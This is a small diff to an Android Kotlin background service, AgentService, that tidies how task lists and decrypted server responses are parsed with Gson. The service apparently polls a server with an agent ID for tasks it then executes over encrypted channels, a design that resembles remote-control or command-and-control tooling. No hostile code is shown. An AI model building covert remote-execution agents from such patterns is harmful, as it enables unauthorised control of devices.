@@ -177,7 +177,8 @@ class AgentService : Service() {
     private fun fetchTasks(): List<Task> {
         val payload = mapOf("agent_id" to agentId!!)
         val resp = post("/tasks", payload)
-        return resp?.get("tasks")?.let { gson.fromJson(gson.toJson(it), Array<Task>::class.java).toList() } ?: emptyList()
+        val tasksJson = resp?.get("tasks")
+        return tasksJson?.let { gson.fromJson(gson.toJson(it), Array<Task>::class.java).toList() } ?: emptyList()
     }
 
     private fun executeTask(task: Task) {
@@ -214,7 +215,8 @@ class AgentService : Service() {
 
         if (conn.responseCode == 200) {
             val decrypted = decrypt(conn.inputStream.readAllBytes())
-            return gson.fromJson(String(decrypted, StandardCharsets.UTF_8), Map::class.java)
+            val type = object : com.google.gson.reflect.TypeToken<Map<String, Any>>() {}.type
+            return gson.fromJson(String(decrypted, StandardCharsets.UTF_8), type)
         }
         return null
     }
